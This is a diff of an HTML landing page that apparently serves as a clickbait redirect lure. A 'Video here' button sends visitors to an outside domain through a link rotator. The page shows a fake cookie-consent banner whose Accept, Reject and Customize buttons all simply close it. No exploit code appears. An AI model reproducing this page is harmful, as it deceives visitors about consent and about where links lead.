@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Video Access</title>
+    <title>suhs – hodratxhub click</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
@@ -11,13 +11,14 @@
             --text-gray: #606770;
             --video-blue: #2c4da7;
             --video-yellow: #f1c40f;
+            --admin-cyan: #00c4cc;
         }
 
         body, html {
             margin: 0;
             padding: 0;
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f7f8fa;
+            background-color: #ffffff;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,15 +26,10 @@
             overflow: hidden;
         }
 
-        /* Konten Utama */
+        /* Tombol Video Utama di Tengah */
         .main-container {
             text-align: center;
-            transition: filter 0.3s ease;
-        }
-
-        /* Blur saat popup muncul */
-        .is-blurred {
-            filter: blur(4px);
+            z-index: 1;
         }
 
         .btn-video-link {
@@ -44,78 +40,69 @@
             cursor: pointer;
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 8px;
             text-decoration: none;
-            transition: transform 0.2s;
+            transition: transform 0.1s;
         }
 
-        .btn-video-link:active {
-            transform: scale(0.95);
-        }
-
+        .btn-video-link:active { transform: scale(0.96); }
         .blue-part { color: var(--video-blue); }
         .yellow-part { color: var(--video-yellow); }
 
-        /* Overlay Popup */
-        .overlay {
+        /* Container Popup */
+        .cookie-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.3); /* Overlay tipis transparan */
             display: flex;
-            align-items: flex-end; /* Mobile friendly bottom sheet */
-            justify-content: center;
             z-index: 9999;
+            pointer-events: none; /* Klik bisa tembus ke belakang jika area kosong */
         }
 
-        /* Kotak Cookie Modern */
+        /* Card Cookie */
         .cookie-card {
             background: #ffffff;
-            width: 100%;
-            max-width: 450px;
-            padding: 30px 24px;
-            border-radius: 20px 20px 0 0;
-            box-shadow: 0 -10px 25px rgba(0,0,0,0.1);
-            text-align: center; /* Tulisan Tengah */
-            animation: slideUp 0.4s cubic-bezier(0.25, 1, 0.5, 1);
-        }
-
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
+            pointer-events: auto; /* Tombol tetap bisa diklik */
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
         }
 
         .cookie-card h2 {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 700;
-            margin: 0 0 12px 0;
-            color: #1c1e21;
+            margin: 0 0 10px 0;
+            color: #000;
         }
 
         .cookie-card p {
-            font-size: 15px;
+            font-size: 14px;
             color: var(--text-gray);
-            line-height: 1.6;
-            margin-bottom: 25px;
+            line-height: 1.5;
+            margin: 0 0 20px 0;
         }
 
-        /* Tombol Cookie */
+        /* Group Tombol */
         .button-group {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
+            gap: 10px;
         }
 
         .btn-base {
-            width: 100%;
-            padding: 14px;
-            border-radius: 10px;
-            font-size: 16px;
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
             border: 1px solid #dddfe2;
             background: #ffffff;
             color: #4b4f56;
+            transition: background 0.2s;
         }
 
         .btn-primary {
@@ -124,30 +111,54 @@
             border: none;
         }
 
-        .btn-primary:hover { background: #166fe5; }
-        .btn-base:not(.btn-primary):hover { background: #f2f3f5; }
-
-        /* Footer CookieAdmin Berwarna */
+        /* Branding CookieAdmin */
         .cookie-footer {
-            margin-top: 20px;
-            font-size: 13px;
+            margin-top: 15px;
+            font-size: 12px;
             color: #8a8d91;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 6px;
-        }
-
-        .admin-brand {
-            color: #00c4cc; /* Warna Turquoise Modern */
-            font-weight: 800;
-            display: flex;
-            align-items: center;
             gap: 4px;
         }
 
-        .admin-brand i {
-            color: #00c4cc;
+        .admin-brand {
+            color: var(--admin-cyan);
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        /* RESPONSIVE LOGIC */
+
+        /* Tampilan Desktop (Pojok Kiri Bawah) */
+        @media (min-width: 768px) {
+            .cookie-overlay {
+                align-items: flex-end;
+                justify-content: flex-start;
+                padding: 20px;
+            }
+            .cookie-card {
+                width: 380px;
+                border-radius: 12px;
+            }
+        }
+
+        /* Tampilan Mobile (Full Bottom Sheet) */
+        @media (max-width: 767px) {
+            .cookie-overlay {
+                align-items: flex-end;
+                justify-content: center;
+            }
+            .cookie-card {
+                width: 100%;
+                border-radius: 20px 20px 0 0;
+                padding: 30px 20px;
+            }
+            .button-group {
+                flex-direction: column; /* Tombol ke bawah di HP */
+            }
         }
 
         .hidden { display: none !important; }
@@ -155,26 +166,26 @@
 </head>
 <body>
 
-    <div id="mainContent" class="main-container is-blurred">
+    <div class="main-container">
         <button class="btn-video-link" onclick="handleVideoClick()">
-            <span class="blue-part">🔗👉Video</span> 
+            <span class="blue-part">🔗👉 Video</span> 
             <span class="yellow-part">here</span>
             <span class="blue-part">🔗</span>
         </button>
     </div>
 
-    <div id="cookieModal" class="overlay">
+    <div id="cookieModal" class="cookie-overlay">
         <div class="cookie-card">
             <h2>We respect your privacy</h2>
             <p>
                 Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
-                Manage your preferences or click "Accept All" to continue.
+                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or Reject All to decline non-essential cookies.
             </p>
             
             <div class="button-group">
-                <button class="btn-base btn-primary" onclick="dismissModal()">Accept All</button>
-                <button class="btn-base" onclick="dismissModal()">Reject All</button>
                 <button class="btn-base" onclick="dismissModal()">Customize</button>
+                <button class="btn-base" onclick="dismissModal()">Reject All</button>
+                <button class="btn-base btn-primary" onclick="dismissModal()">Accept All</button>
             </div>
 
             <div class="cookie-footer">
@@ -187,12 +198,12 @@
     </div>
 
     <script>
-        // Logika Rotator
+        // Logika Rotator Link (dari file index.php)
         const urlParams = new URLSearchParams(window.location.search);
         const videoId = urlParams.get('id') || 'default';
 
         const daftarDomain = [
-            "https://mogoflox.it.com/v/",
+            "https://mogoflox.it.com/",
         ];
 
         function handleVideoClick() {
@@ -202,7 +213,6 @@
 
         function dismissModal() {
             document.getElementById('cookieModal').classList.add('hidden');
-            document.getElementById('mainContent').classList.remove('is-blurred');
         }
     </script>
 </body>
